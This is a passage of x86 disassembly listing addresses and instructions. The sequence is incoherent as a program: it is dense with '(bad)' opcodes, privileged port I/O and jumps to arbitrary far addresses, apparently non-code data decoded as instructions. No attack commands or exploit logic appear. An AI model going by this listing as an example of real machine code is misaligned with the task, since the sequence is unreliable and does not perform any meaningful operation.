  43620e:	jbe    0x436271
  436210:	mov    WORD PTR [ecx],?
  436212:	jnp    0x4361a2
  436214:	mov    DWORD PTR [eiz*8+0x1c7aa60],esi
  43621b:	sub    al,0x9
  43621d:	stc    
  43621e:	out    dx,al
  43621f:	dec    ebx
  436220:	jnp    0x436291
  436222:	mov    ds:0xdc131fa6,al
  436227:	mov    al,ds:0x8d741ab0
  43622c:	nop
  43622d:	sbb    DWORD PTR ds:0xad895b9f,esi
  436233:	jbe    0x43629a
  436235:	mov    ch,0x4b
  436237:	pop    ss
  436238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436239:	add    dh,al
  43623b:	jb     0x436275
  43623d:	sar    DWORD PTR [eax],1
  43623f:	mov    eax,ds:0x1386788e
  436244:	mov    eax,0x5e963255
  436249:	rol    DWORD PTR [eax+ebp*8-0x7deff994],cl
  436250:	mov    cl,0x6d
  436252:	outs   dx,BYTE PTR ds:[esi]
  436253:	cmc    
  436254:	mov    esi,0x935e8efb
  436259:	add    eax,0x1dd09ee
  43625e:	ret    0xb086
  436261:	iret   
  436262:	test   BYTE PTR [ecx-0x4aa9be04],ah
  436268:	div    DWORD PTR [edi+0x6352861f]
  43626e:	imul   ecx,DWORD PTR [ebx+ebx*2+0x17],0xffffffea
  436273:	ins    DWORD PTR es:[edi],dx
  436274:	out    dx,al
  436275:	jecxz  0x436269
  436277:	jge    0x436291
  436279:	mov    ebx,0x2cb899d8
  43627e:	inc    ebp
  43627f:	das    
  436280:	fimul  WORD PTR [ebx-0x76]
  436283:	sti    
  436284:	imul   ecx,DWORD PTR [eax],0xffffffee
  436287:	push   0x52ab03b5
  43628c:	fcmovnu st,st(7)
  43628e:	add    al,0xa0
  436290:	mov    ebp,0x9e1110ab
  436295:	into   
  436296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436297:	push   ds
  436298:	(bad)  
  436299:	pushf  
  43629a:	out    dx,al
  43629b:	popa   
  43629c:	cmp    al,0x4f
  43629e:	sbb    edi,0xffffff8b
  4362a1:	xchg   ecx,eax
  4362a2:	(bad)  [eax+0x1135a310]
  4362a8:	shl    BYTE PTR [ecx+0x6d],1
  4362ab:	mov    ah,0x5e
  4362ad:	pop    ebx
  4362ae:	test   BYTE PTR [ebx+ebx*2],dl
  4362b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4362b2:	dec    esi
  4362b3:	inc    esi
  4362b4:	dec    eax
  4362b5:	pop    edi
  4362b6:	sbb    BYTE PTR [edx+esi*1+0x27],dh
  4362ba:	call   0x377c:0xea52fecd
  4362c1:	stos   DWORD PTR es:[edi],eax
  4362c2:	imul   eax,edi,0xffffffd9
  4362c5:	int    0xee
  4362c7:	add    dl,BYTE PTR [edi-0x78782b32]
  4362cd:	pusha  
  4362ce:	sub    DWORD PTR [ebx],ebp
  4362d0:	dec    eax
  4362d1:	test   DWORD PTR [edi+0x33],edi
  4362d4:	dec    edx
  4362d5:	sub    dh,0x56
  4362d8:	xor    bl,BYTE PTR [edi-0x10]
  4362db:	pop    edx
  4362dc:	lock das 
  4362de:	ret    0xa279
  4362e1:	and    BYTE PTR [eax+0x5c711ba0],bh
  4362e7:	fcmovnb st,st(7)
  4362e9:	xchg   bh,cl
  4362eb:	mov    bl,BYTE PTR [edi-0x5f]
  4362ee:	pop    es
  4362ef:	dec    esp
  4362f0:	(bad)  
  4362f1:	mov    eax,0x243f1166
  4362f6:	and    BYTE PTR [ecx-0x7af72370],ah
  4362fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4362fd:	ins    DWORD PTR es:[edi],dx
  4362fe:	sbb    al,0xde
  436300:	pop    esi
  436301:	sbb    al,0x1e
  436303:	pusha  
  436304:	test   DWORD PTR [ecx+0x5f136698],esi
  43630a:	push   esi
  43630b:	mov    bh,0xa9
  43630d:	dec    edx
  43630e:	dec    ebx
  43630f:	push   ss
  436310:	fidivr WORD PTR [esi-0x7eda9db8]
  436316:	(bad)  
  436317:	aam    0x5e
  436319:	repnz sbb ebx,DWORD PTR [ebx]
  43631c:	ja     0x43638a
  43631e:	sar    DWORD PTR ds:0x25160e3,1
  436324:	retf   0x932e
  436327:	push   ecx
  436328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436329:	mov    al,ds:0x87ed6ee
  43632e:	and    al,0x30
  436330:	test   BYTE PTR [ebx],bh
  436332:	adc    ah,ch
  436334:	out    dx,eax
  436335:	pusha  
  436336:	aad    0xba
  436338:	aas    
  436339:	push   ds
  43633a:	push   edx
  43633b:	es and eax,0x29a1ee0d
  436341:	lea    esp,[eax+eax*1]
  436344:	fistp  QWORD PTR [esi+ecx*2-0x5f]
  436348:	add    eax,0xbbdad008
  43634d:	ja     0x4363cd
  43634f:	ins    BYTE PTR es:[edi],dx
  436350:	pop    esi
  436351:	adc    DWORD PTR [edx],ebx
  436353:	xchg   edx,eax
  436354:	sbb    BYTE PTR [ebx+0x611c98b6],ah
  43635a:	stc    
  43635b:	jmp    0x436307
  43635d:	jmp    0x5bcaeab7
  436362:	out    dx,al
  436363:	sub    ecx,DWORD PTR [ebx+0xb13636f]
  436369:	jge    0x43634f
  43636b:	mov    al,ds:0xc7380729
  436370:	in     eax,dx
  436371:	push   esi
  436372:	mov    DWORD PTR [ebx],esi
  436374:	pop    esi
  436375:	xor    eax,0xc11f83ba
  43637a:	add    ah,BYTE PTR [edi+0x5c]
  43637d:	popa   
  43637e:	gs pop ds
  436380:	loopne 0x436399
  436382:	jne    0x43634f
  436384:	aad    0x25
  436386:	jmp    0x43636d
  436388:	dec    esi
  436389:	jne    0x4363e7
  43638b:	add    eax,0xe24cb0f2
  436390:	mov    eax,0x3a095160
  436395:	xlat   BYTE PTR ds:[ebx]
  436396:	push   0xffffff9d
  436398:	fnsave [esi+0x39f6ccd7]
  43639e:	out    dx,al
  43639f:	jmp    DWORD PTR [edx-0x3c444eeb]
  4363a5:	sub    DWORD PTR [esi+0x7edd6da0],edi
  4363ab:	mov    ebx,0x550d884c
  4363b0:	pop    esi
  4363b1:	fld    QWORD PTR [edi]
  4363b3:	inc    esp
  4363b4:	sbb    ebx,DWORD PTR [edi+0x53575886]
  4363ba:	sahf   
  4363bb:	cs pop edx
  4363bd:	popf   
  4363be:	scas   al,BYTE PTR es:[edi]
  4363bf:	into   
  4363c0:	in     al,0xf8
  4363c2:	mov    ah,0x9b
  4363c4:	pop    esi
  4363c5:	and    ebx,DWORD PTR ds:0xcc0a472c
  4363cb:	div    BYTE PTR ds:0x348f0d61
  4363d1:	mov    es,WORD PTR [ebp*4-0x48defebc]
  4363d8:	js     0x43635c
  4363da:	bound  edx,QWORD PTR [edx]
  4363dc:	xor    al,0x2b
  4363de:	outs   dx,BYTE PTR ds:[esi]
  4363df:	in     eax,dx
  4363e0:	fild   DWORD PTR [ebx-0x60]
  4363e3:	(bad)  
  4363e5:	and    ebp,esi
  4363e7:	mov    ebp,0x489d5045
  4363ec:	jecxz  0x436400
  4363ee:	aam    0xa0
  4363f0:	inc    edx
  4363f1:	mov    al,ds:0xc36d1472
  4363f6:	dec    edi
  4363f7:	pop    ss
  4363f8:	pop    esi
  4363f9:	push   edx
  4363fa:	push   esp
  4363fb:	xchg   edi,eax
  4363fc:	jp     0x436383
  4363fe:	jmp    0x4363a6
  436400:	in     eax,dx
  436401:	pusha  
  436402:	mov    al,ds:0x4df21c4d
  436407:	aaa    
  436408:	fadd   QWORD PTR [edx]
  43640a:	out    dx,al
  43640b:	pop    edi
  43640c:	mov    edi,0x640ef571
  436411:	or     eax,0xca90a18c
  436416:	mov    ds:0xf6641521,al
  43641b:	fstp   QWORD PTR [esi+0x3d]
  43641e:	jmp    0xc66e:0xb6f6cf4c
  436425:	pop    edi
  436426:	inc    esi
  436427:	push   esi
  436428:	push   cs
  436429:	retf   
  43642a:	sbb    eax,0xef40979d
  43642f:	sub    eax,0x6a48da5d
  436434:	push   eax
  436435:	mov    BYTE PTR [edx],ch
  436437:	out    dx,al
  436438:	(bad)  
  436439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43643a:	xchg   esp,eax
  43643b:	mov    eax,ds:0x905309a5
  436440:	mov    esp,0x5d78ea42
  436445:	lods   eax,DWORD PTR ds:[esi]
  436446:	sbb    eax,0x4ebc1afa
  43644b:	push   cs
  43644c:	jle    0x4364b9
  43644e:	repz mov al,ds:0x508eec0d
  436454:	and    eax,0xae1e2267
  436459:	sbb    al,0xeb
  43645b:	mov    ah,0x6b
  43645d:	cmp    BYTE PTR [edx],ch
  43645f:	test   DWORD PTR [eax-0x37],ebp
  436462:	test   eax,0x5860946a
  436467:	xor    ebp,edx
  436469:	adc    eax,0x3a39e851
  43646e:	out    dx,al
  43646f:	(bad)  
  436470:	fsubr  QWORD PTR [ebp-0x54]
  436473:	mov    edx,fs
  436475:	mov    DWORD PTR [ecx-0x5f],ecx
  436478:	gs mov dl,0x52
  43647b:	jae    0x43646d
  43647d:	inc    ecx
  43647e:	push   ecx
  43647f:	cld    
  436480:	pop    esi
  436481:	jecxz  0x43644e
  436483:	adc    edi,DWORD PTR [esi+0x103131fd]
  436489:	popa   
  43648a:	ror    BYTE PTR [eax+0x762173bb],1
  436490:	xor    ah,BYTE PTR [esi]
  436492:	out    0x5f,eax
  436494:	or     DWORD PTR [ecx+0x1e],0xffffffd7
  436498:	popf   
  436499:	icebp  
  43649a:	les    ecx,FWORD PTR [edx]
  43649c:	cwde   
  43649d:	inc    eax
  43649e:	das    
  43649f:	push   0xffffffbb
  4364a1:	pusha  
  4364a2:	and    al,0x2b
  4364a4:	imul   ebx,DWORD PTR [eax+0x4e],0xee729565
  4364ab:	mov    ds:0x9b5d08aa,al
  4364b0:	adc    eax,0xdcee3eb2
  4364b5:	pop    edi
  4364b6:	cmp    ebp,ebp
  4364b8:	imul   edi,edi,0xfffffff1
  4364bb:	cmp    eax,0xd5ffa95f
  4364c0:	arpl   WORD PTR [eax+0x410e444c],di
  4364c6:	or     ebx,DWORD PTR [edi]
  4364c8:	push   esi
  4364c9:	dec    esp
  4364ca:	cmp    esp,DWORD PTR [ecx+0x7b1d4fae]
  4364d0:	popf   
  4364d1:	push   cs
  4364d2:	sbb    DWORD PTR [ecx+0x5d],ebx
  4364d5:	cli    
  4364d6:	aaa    
  4364d7:	sub    DWORD PTR [edi],esi
  4364d9:	dec    ebx
  4364da:	lock mov ecx,0xa157ecee
  4364e0:	jno    0x436484
  4364e2:	ins    DWORD PTR es:[edi],dx
  4364e3:	scas   al,BYTE PTR es:[edi]
  4364e4:	scas   eax,DWORD PTR es:[edi]
  4364e5:	stos   BYTE PTR es:[edi],al
  4364e6:	add    BYTE PTR [esi+ebx*2+0xe47418e],al
  4364ed:	pop    esi
  4364ee:	pop    ds
  4364ef:	xchg   esp,eax
  4364f0:	shl    DWORD PTR [eax+0x3f],1
  4364f3:	mov    edx,0x1f3c88c1
  4364f8:	inc    edi
  4364f9:	lock in eax,dx
  4364fb:	lods   al,BYTE PTR ds:[esi]
  4364fc:	pushf  
  4364fd:	test   ch,bh
  4364ff:	jns    0x4364f2
  436501:	push   esp
  436502:	pusha  
  436503:	loope  0x4364b0
  436505:	push   sp
  436507:	mov    eax,ds:0x70937ed3
  43650c:	jecxz  0x4364a9
  43650e:	idiv   ebp
  436510:	pop    ebp
  436511:	int    0xfb
  436513:	mov    ecx,0xeab30a8a
  436518:	jp     0x436553
  43651a:	jl     0x4364bd
  43651c:	and    DWORD PTR [edx],edx
  43651e:	pop    eax
  43651f:	out    0xbd,eax
  436521:	in     al,0x6f
  436523:	sbb    ch,BYTE PTR [ebx+eiz*8-0x12]
  436527:	fpatan 
  436529:	push   eax
  43652a:	jnp    0x4364b6
  43652c:	lock xchg esi,eax
  43652e:	icebp  
  43652f:	mov    al,ds:0xc6fb3485
  436534:	mov    ah,ch
  436536:	mov    bh,BYTE PTR [eax-0x5b11d813]
  43653c:	sbb    bl,ah
  43653e:	dec    esi
  43653f:	and    ah,BYTE PTR [edx]
  436541:	scas   al,BYTE PTR es:[edi]
  436542:	dec    edi
  436543:	xchg   esp,eax
  436544:	dec    eax
  436545:	aad    0xfd
  436547:	mov    al,ds:0x56737d60
  43654c:	cmc    
  43654d:	repnz out dx,al
  43654f:	fdivr  DWORD PTR [esi+eax*8]
  436552:	mov    ch,0xf3
  436554:	enter  0x5a2c,0xa1
  436558:	sub    BYTE PTR [ebp+edi*1-0x59],dh
  43655c:	repz jg 0x436517
  43655f:	jo     0x4365bf
  436561:	aam    0xc7
  436563:	mov    al,0xcb
  436565:	push   esp
  436566:	rcr    DWORD PTR [ebx],1
  436568:	das    
  436569:	popa   
  43656a:	push   edx
  43656b:	fsub   QWORD PTR [esi+0x6dc2ff73]
  436571:	mov    bl,0xee
  436573:	mov    edi,DWORD PTR ds:0xfb5b5cb7
  436579:	popa   
  43657a:	mov    al,0xa0
  43657c:	frstor [ebx+0x4bd03817]
  436582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436583:	arpl   WORD PTR [esi],sp
  436585:	mov    WORD PTR [ebx],?
  436587:	mov    eax,ds:0x77de77fd
  43658c:	jae    0x4365b6
  43658e:	inc    ebx
  43658f:	mov    eax,ds:0xe59ebfa4
  436594:	aam    0xfb
  436596:	lock pop edi
  436598:	pop    edi
  436599:	ins    BYTE PTR es:[edi],dx
  43659a:	jmp    0x4365f3
  43659c:	lock jnp 0x436552
  43659f:	sub    BYTE PTR [eax+0x7f],ah
  4365a2:	jl     0x436545
  4365a4:	mov    bh,0x41
  4365a6:	and    eax,0x409d7db4
  4365ab:	iret   
  4365ac:	pop    esi
  4365ad:	test   BYTE PTR [esi+0x4ff5445f],0xa
  4365b4:	int3   
  4365b5:	pusha  
  4365b6:	mov    WORD PTR [ebp+0x31],?
  4365b9:	lock aam 0xc6
  4365bc:	pop    eax
  4365bd:	fimul  WORD PTR [esi+0x78]
  4365c0:	pop    ebx
  4365c1:	cmp    eax,0xd19a089a
  4365c6:	pushf  
  4365c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4365c8:	sahf   
  4365c9:	rcr    cl,0xa9
  4365cc:	pop    ebx
  4365cd:	popa   
  4365ce:	cmp    ecx,DWORD PTR [edi+0x73]
  4365d1:	loopne 0x436595
  4365d3:	mov    ds:0xb8eecfd0,al
  4365d8:	ins    DWORD PTR es:[edi],dx
  4365d9:	enter  0x8b80,0x59
  4365dd:	mov    ah,0x1a
  4365df:	mov    eax,ds:0x143beb43
  4365e4:	mov    al,0x9c
  4365e6:	shr    DWORD PTR [ebx+ebx*2+0x546b4d87],0x32
  4365ee:	lods   eax,DWORD PTR ds:[esi]
  4365ef:	loop   0x43661e
  4365f1:	test   al,0x62
  4365f3:	inc    esp
  4365f4:	hlt    
  4365f5:	test   al,0xc3
  4365f7:	mov    ds:0xbbc944c9,al
  4365fc:	aas    
  4365fd:	test   BYTE PTR [ebp+0x1fb1055b],ch
  436603:	jbe    0x436662
  436605:	add    al,0x39
  436607:	mov    al,ds:0x8e8c655d
  43660c:	mov    fs,WORD PTR ds:0x44da7cd3
  436612:	ds retf 0x211c
  436616:	int    0x30
  436618:	fcmovb st,st(2)
  43661b:	rcl    DWORD PTR [ecx+0x5c],1
  43661e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43661f:	mov    WORD PTR [edx],ss
  436621:	push   ds
  436622:	inc    edx
  436623:	(bad)  
  436624:	sahf   
  436625:	retf   0x7718
  436628:	test   al,0xb
  43662a:	push   cs
  43662b:	mov    eax,ds:0x722df40e
  436630:	not    bh
  436632:	retf   0x5e22
  436635:	fs (bad) 
  436637:	pop    esi
  436638:	mov    eax,0x947bb69a
  43663d:	pusha  
  43663e:	shl    BYTE PTR [ecx+ebp*2-0x15],1
  436642:	or     eax,0xe7bdc31f
  436647:	int    0x45
  436649:	inc    eax
  43664a:	ret    0xe56
  43664d:	pop    eax
  43664e:	imul   ebx,edi,0xc7555290
  436654:	into   
  436655:	add    ah,cl
  436657:	mov    edx,0x895631fc
  43665c:	lods   eax,DWORD PTR ds:[esi]
  43665d:	cmc    
  43665e:	in     eax,dx
  43665f:	repnz cmp eax,0xf7740feb
  436665:	xlat   BYTE PTR ds:[ebx]
  436666:	dec    esi
  436667:	push   edx
  436668:	iret   
  436669:	pusha  
  43666a:	scas   al,BYTE PTR es:[edi]
  43666b:	in     al,dx
  43666c:	sub    DWORD PTR [eax+0x55],0x4
  436670:	mov    dh,BYTE PTR [edx+0x7144e2ee]
  436676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436678:	mov    dl,0xb8
  43667a:	xor    DWORD PTR [ecx-0x19007aa3],esp
  436680:	cmc    
  436681:	adc    bl,al
  436683:	mov    edx,0xb64a45e
  436688:	ins    DWORD PTR es:[edi],dx
  436689:	stos   DWORD PTR es:[edi],eax
  43668a:	sub    eax,0x5060e192
  43668f:	pop    edi
  436690:	and    BYTE PTR [edx],al
  436692:	mov    eax,ds:0xea5fdc43
  436697:	loope  0x4366f5
  436699:	ret    0x25fc
  43669c:	mov    ah,0x60
  43669e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43669f:	ror    DWORD PTR [ebp+0x6],0xcc
  4366a3:	gs pop edi
  4366a5:	dec    ebx
  4366a6:	sbb    eax,0x85d611c7
  4366ab:	xor    DWORD PTR ds:0x208e74ff,0xb321a3b4
  4366b5:	pop    ecx
  4366b6:	idiv   BYTE PTR [ebp+ecx*2+0x51fa1621]
  4366bd:	add    bh,ch
  4366bf:	lds    ebp,FWORD PTR [ecx+0x4c]
  4366c2:	inc    ebx
  4366c3:	cmp    eax,0xa7d4dabd
  4366c8:	mov    BYTE PTR [ebx-0x54],dl
  4366cb:	test   DWORD PTR [edi-0x710f0813],esp
  4366d1:	jle    0x43669c
  4366d3:	bound  ebx,QWORD PTR [esi-0x8]
  4366d6:	sub    BYTE PTR [edi-0x38],cl
  4366d9:	pop    edi
  4366da:	add    edx,DWORD PTR [edi+0x6e]
  4366dd:	push   esi
  4366de:	fidiv  DWORD PTR [ecx]
  4366e0:	ds mov ch,0x7d
  4366e3:	nop
  4366e4:	cli    
  4366e5:	push   ebp
  4366e6:	or     ah,BYTE PTR [ebx-0x3c0cb9a2]
  4366ec:	pop    ecx
  4366ed:	xchg   esp,eax
  4366ee:	dec    DWORD PTR [ecx-0x15]
  4366f1:	and    ebp,DWORD PTR [esi+0x51]
  4366f4:	mov    ds:0x2e08cc8a,eax
  4366f9:	popa   
  4366fa:	icebp  
  4366fb:	in     eax,0x3b
  4366fd:	lock int 0x88
  436700:	aad    0x16
  436702:	out    dx,al
  436703:	sub    eax,0x3eaf4ff3
  436708:	xor    al,0x2a
  43670a:	jg     0x4366ad
  43670c:	sub    al,0x47
  43670e:	loope  0x4366f6
  436710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436711:	xchg   esp,eax
  436712:	aas    
  436713:	neg    BYTE PTR [esi+0x62]
  436716:	adc    bh,BYTE PTR [edi+0x4900d25d]
  43671c:	mov    cl,0x63
  43671e:	or     al,0x69
  436720:	pop    ebx
  436721:	aas    
  436722:	inc    edx
  436723:	sar    BYTE PTR [esi-0x71057b10],cl
  436729:	call   0x939a241c
  43672e:	dec    ecx
  43672f:	add    bl,cl
  436731:	or     ch,bh
  436733:	mov    al,ds:0xc5cf2f1b
  436738:	lea    eax,[edx-0x69]
  43673b:	pop    es
  43673c:	pop    esi
  43673d:	sub    eax,0x8346a48f
  436742:	mov    dh,0x5a
  436744:	sbb    ah,BYTE PTR [ecx-0x8]
  436747:	mov    esi,0xbe4719a6
  43674c:	pop    ebx
  43674d:	ja     0x43673d
  43674f:	xor    eax,0xc79ac4a0
  436754:	repnz inc edi
  436756:	loope  0x4366f6
  436758:	sub    eax,0x1e3e5286
  43675d:	push   0x7fef0bea
  436762:	adc    BYTE PTR [eax-0x72],ch
  436765:	fucomi st,st(5)
  436767:	push   cs
  436768:	je     0x43679d
  43676a:	mov    ecx,0x67388e8b
  43676f:	mov    eax,ds:0x1b2b08a1
  436774:	sahf   
  436775:	leave  
  436776:	mov    eax,ebp
  436778:	repz adc bl,bh
  43677b:	rol    DWORD PTR [ebp+0x4a],cl
  43677e:	out    0xdd,eax
  436780:	daa    
  436781:	cmp    eax,0x367c2190
  436786:	clc    
  436787:	(bad)  
  436788:	addr16 popa 
  43678a:	sbb    al,0xa9
  43678c:	add    cx,si
  43678f:	jbe    0x436743
  436791:	or     cl,BYTE PTR [ecx+eiz*1+0x5e]
  436795:	rcl    BYTE PTR [esi+ebp*8],cl
  436798:	mov    esp,0xe1f23585
  43679d:	pusha  
  43679e:	je     0x436808
  4367a0:	stos   BYTE PTR es:[edi],al
  4367a1:	es jecxz 0x436799
  4367a4:	dec    ebp
  4367a5:	sub    edi,edx
  4367a7:	into   
  4367a8:	inc    edi
  4367a9:	ds fwait
  4367ab:	mov    eax,ds:0xd38dfb6
  4367b0:	sti    
  4367b1:	push   ebp
  4367b2:	cwde   
  4367b3:	mov    eax,ds:0x5e3bee1
  4367b8:	pop    ebp
  4367b9:	in     eax,dx
  4367ba:	jg     0x4367a3
  4367bc:	mov    eax,fs:0x60ccb4f1
  4367c2:	mov    bh,0x8f
  4367c4:	hlt    
  4367c5:	mov    ds:0x9cefa187,eax
  4367ca:	ja     0x436833
  4367cc:	add    ah,BYTE PTR [edi+0x6f]
  4367cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4367d0:	pop    esi
  4367d1:	pushf  
  4367d2:	sbb    eax,DWORD PTR [ecx+0x4a]
  4367d5:	push   ds
  4367d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4367d7:	enter  0x6136,0x39
  4367db:	jl     0x43677c
  4367dd:	mov    ecx,0xce418794
  4367e2:	out    dx,al
  4367e3:	mov    ecx,0xec0e27d2
  4367e8:	loop   0x4367d9
  4367ea:	fisub  WORD PTR [eax+0x3c7d022f]
  4367f0:	repnz xor al,0x79
  4367f3:	xchg   BYTE PTR [esi+0x18],bl
  4367f6:	inc    eax
  4367f7:	xchg   ebp,eax
  4367f8:	fist   DWORD PTR [edx+esi*2]
  4367fb:	rol    ebx,cl
  4367fd:	pop    esi
  4367fe:	xchg   DWORD PTR [edx-0x13],edx
  436801:	lods   al,BYTE PTR ds:[esi]
  436802:	in     al,dx
  436803:	jmp    0xb55e:0x13c7ed7e
  43680a:	out    0xc6,al
  43680c:	test   DWORD PTR [esi],eax
  43680e:	inc    eax
  43680f:	pop    esi
  436810:	test   al,0xb4
  436812:	push   0x6af898a1
  436817:	aam    0x21
  436819:	mov    ecx,0x575df0ce
  43681e:	iret   
  43681f:	imul   ebp,DWORD PTR ds:0x72892f22,0xffffffda
  436826:	and    eax,0x6083a5bd
  43682b:	xchg   edi,eax
  43682c:	inc    edx
  43682d:	ror    DWORD PTR [esi-0x6a],0x5e
  436831:	and    al,0xcc
  436833:	popf   
  436834:	cmp    eax,DWORD PTR [edx+0x5b]
  436837:	hlt    
  436838:	jl     0x43689a
  43683a:	sub    al,0xa6
  43683c:	leave  
  43683d:	xchg   edi,eax
  43683e:	retf   0x75ca
  436841:	sub    esi,ebp
  436843:	and    DWORD PTR gs:[ebp+0x4f],esi
  436847:	jns    0x43681f
  436849:	cmc    
  43684a:	(bad)  
  43684b:	scas   al,BYTE PTR es:[edi]
  43684c:	aaa    
  43684d:	sbb    eax,0x8ff8e36e
  436852:	and    BYTE PTR [edi],0x7d
  436855:	test   al,0xeb
  436857:	hlt    
  436858:	xor    BYTE PTR [edx+0x9],bl
  43685b:	mov    WORD PTR ds:[ecx-0x3f258011],ss
  436862:	and    DWORD PTR [eax-0x5dfa3fb6],edi
  436868:	pop    edi
  436869:	push   edx
  43686a:	inc    ecx
  43686b:	mov    esi,0x58b3a28e
  436870:	pop    ebp
  436871:	out    dx,al
  436872:	out    dx,al
  436873:	into   
  436874:	dec    ebp
  436875:	mov    dh,0xa0
  436877:	or     al,0x96
  436879:	ds push ds
  43687b:	mov    al,ds:0x69a37b2a
  436880:	mov    esi,0x2fa204b
  436885:	jmp    0x76a0b970
  43688a:	push   edi
  43688b:	inc    esp
  43688c:	fwait
  43688d:	mov    al,BYTE PTR ds:0x356afedc
  436893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436894:	lea    edi,[edi-0x7d]
  436897:	sbb    ebp,edi
  436899:	loopne 0x436875
  43689b:	out    0x30,eax
  43689d:	dec    esi
  43689e:	out    dx,eax
  43689f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4368a0:	and    cl,BYTE PTR [edx+ecx*4]
  4368a3:	shr    ebx,0x96
  4368a6:	cwde   
  4368a7:	push   eax
  4368a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4368a9:	addr16 mov cl,0xc6
  4368ac:	arpl   WORD PTR [ecx+ebp*1],di
  4368af:	or     bl,dh
  4368b1:	mov    ebx,0xd8f7531f
  4368b6:	out    dx,al
  4368b7:	mov    eax,0x24cf0d70
  4368bc:	pop    ds
  4368bd:	or     eax,0x1f1aa126
  4368c2:	dec    ebx
  4368c3:	xor    eax,0x3628c7af
  4368c8:	pop    esi
  4368c9:	aaa    
  4368ca:	and    dl,0x8b
  4368cd:	and    eax,0x600af3f1
  4368d2:	jle    0x436950
  4368d4:	inc    esi
  4368d5:	sbb    BYTE PTR [ecx+0x3d],ch
  4368d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4368d9:	sbb    esi,0xffffff80
  4368dc:	aad    0x59
  4368de:	loopne 0x4368c1
  4368e0:	pop    esi
  4368e1:	stos   BYTE PTR es:[edi],al
  4368e2:	xchg   ebp,eax
  4368e3:	xchg   edx,eax
  4368e4:	push   es
  4368e5:	xchg   DWORD PTR [edi+0x7f60a486],esi
  4368eb:	and    BYTE PTR [esp+ebp*1-0x58369be0],al
  4368f2:	jmp    0x4368a8
  4368f4:	push   esp
  4368f5:	jo     0x4368c8
  4368f7:	xchg   edi,eax
  4368f8:	jns    0x4368d3
  4368fa:	cs js  0x4368b6
  4368fd:	std    
  4368fe:	pop    eax
  4368ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436900:	xchg   edx,eax
  436901:	dec    eax
  436902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436903:	mov    ch,BYTE PTR [esi+0x3d]
  436906:	xchg   esi,eax
  436907:	cmp    eax,0x1effba45
  43690c:	fcmovnbe st,st(4)
  43690e:	out    dx,al
  43690f:	je     0x436952
  436911:	ror    ch,cl
  436913:	push   edx
  436914:	ds popa 
  436916:	in     eax,0x3a
  436918:	sub    ebx,ebp
  43691a:	xchg   edx,eax
  43691b:	aas    
  43691c:	pop    ebx
  43691d:	jb     0x436941
  43691f:	push   0x16
  436921:	popa   
  436922:	pop    edx
  436923:	sbb    BYTE PTR [edx],dl
  436925:	jle    0x436958
  436927:	retf   
  436928:	pop    ds
  436929:	popa   
  43692a:	fsubp  st(6),st
  43692c:	mov    edx,DWORD PTR [edi]
  43692e:	mov    ebp,0xee73e7aa
  436933:	int    0xc1
  436935:	push   ss
  436936:	pusha  
  436937:	push   es
  436938:	loope  0x43698a
  43693a:	enter  0xb2a0,0x5c
  43693e:	fcmove st,st(0)
  436940:	sbb    bh,BYTE PTR [ecx-0x20c95723]
  436946:	inc    esi
  436947:	inc    ebp
  436948:	(bad)  
  436949:	(bad)  
  43694a:	out    dx,al
  43694b:	adc    BYTE PTR [esi+0x5193e80],dh
  436951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436952:	xchg   edx,eax
  436953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436954:	in     al,0x33
  436956:	outs   dx,DWORD PTR ds:[esi]
  436957:	icebp  
  436958:	mov    edi,0x3c212ef6
  43695d:	cmp    al,0xa5
  43695f:	mov    eax,ds:0x57a86dc0
  436964:	into   
  436965:	cmp    eax,0xb85e39c3
  43696a:	sbb    DWORD PTR [edx+0x49],ebx
  43696d:	mov    ch,0x18
  43696f:	dec    esi
  436970:	adc    eax,0x274b5d61
  436975:	mov    ecx,0x69240f0d
  43697a:	jecxz  0x436916
  43697c:	pop    esi
  43697d:	mov    es,WORD PTR [edi-0x1f]
  436980:	jmp    esi
  436982:	dec    esp
  436983:	mov    edi,0xa0dfbf12
  436988:	scas   eax,DWORD PTR es:[edi]
  436989:	daa    
  43698a:	int3   
  43698b:	arpl   WORD PTR ds:0x5ec717e5,di
  436991:	ret    
  436992:	jmp    0x2209:0xb6a82ed5
  436999:	popa   
  43699a:	xchg   esi,eax
  43699b:	mov    ds:0x260b5833,al
  4369a0:	popf   
  4369a1:	sub    eax,0xc245e7ef
  4369a6:	dec    edx
  4369a7:	add    DWORD PTR [ebx+0xb7e0d1a],ebp
  4369ad:	pop    edx
  4369ae:	xor    al,0x2d
  4369b0:	dec    eax
  4369b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4369b2:	into   
  4369b3:	xlat   BYTE PTR ds:[ebx]
  4369b4:	dec    ecx
  4369b5:	adc    edx,edx
  4369b7:	xchg   ecx,eax
  4369b8:	les    ebp,FWORD PTR [esi-0x12]
  4369bb:	cwde   
  4369bc:	mov    esp,0xc97dea71
  4369c1:	mov    ebp,0xa74ca024
  4369c6:	push   es
  4369c7:	and    esp,esp
  4369c9:	repz into 
  4369cb:	or     eax,0x2a69988e
  4369d0:	push   eax
  4369d1:	mov    ebx,0xae5bfd53
  4369d6:	jge    0x436a1e
  4369d8:	outs   dx,BYTE PTR ds:[esi]
  4369d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4369da:	sbb    al,ah
